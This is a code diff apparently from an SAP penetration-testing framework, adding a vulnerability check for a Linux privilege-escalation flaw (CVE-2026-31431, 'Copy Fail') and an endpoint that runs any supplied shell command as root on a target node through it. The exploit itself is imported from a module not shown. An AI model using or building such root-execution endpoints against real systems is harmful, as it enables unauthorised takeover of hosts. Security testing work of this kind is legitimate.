@@ -3073,6 +3073,73 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/check_copyfail", method="POST")
+    def node_check_copyfail(sid):
+        """Check if this node's Linux host is vulnerable to CVE-2026-31431."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            _task_start(f"{sid}:check_copyfail", f"{sid}: checking CVE-2026-31431")
+            try:
+                from sapmap_copyfail import check_copyfail
+                res = check_copyfail(node)
+                node.copyfail_vulnerable = res.get("vulnerable", False)
+                node.copyfail_kernel = res.get("kernel", "")
+                sev = "HIGH" if res["vulnerable"] else "INFO"
+                sapmap_findings.emit_finding(
+                    sev, sid,
+                    f"CVE-2026-31431 (Copy Fail): "
+                    f"{'VULNERABLE' if res['vulnerable'] else 'not vulnerable'} "
+                    f"— kernel {res.get('kernel', '?')}. {res.get('reason', '')}",
+                    ref="lpe.copyfail.check",
+                    meta=res)
+            except Exception as e:
+                print(f"[-] {sid}: check_copyfail error: {e}")
+            finally:
+                _task_end(f"{sid}:check_copyfail")
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_copyfail", method="POST")
+    def node_exploit_copyfail(sid):
+        """Run a shell command as root via CVE-2026-31431 Copy Fail LPE."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        command = data.get("command", "id")
+
+        def _run():
+            _task_start(f"{sid}:exploit_copyfail",
+                        f"{sid}: Copy Fail LPE — running: {command}")
+            try:
+                from sapmap_copyfail import run_as_root
+                res = run_as_root(node, command)
+                if res.get("ok"):
+                    node.copyfail_root_obtained = True
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"Root obtained via CVE-2026-31431 on {sid}. "
+                        f"Command: {command!r}. "
+                        f"Output: {res.get('stdout', '')[:200]}",
+                        ref="lpe.copyfail.root_obtained",
+                        meta={"command": command,
+                              "stdout": res.get("stdout", "")[:500]})
+                    print(f"[+] {sid}: Copy Fail root — output: "
+                          f"{res.get('stdout', '')[:300]!r}")
+                else:
+                    print(f"[-] {sid}: Copy Fail failed: {res.get('error')}")
+            except Exception as e:
+                print(f"[-] {sid}: exploit_copyfail error: {e}")
+            finally:
+                _task_end(f"{sid}:exploit_copyfail")
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/download_java_table", method="POST")
     def node_download_java_table(sid):
         """Run a SELECT against the Java stack's DB via JSP/JDBC."""
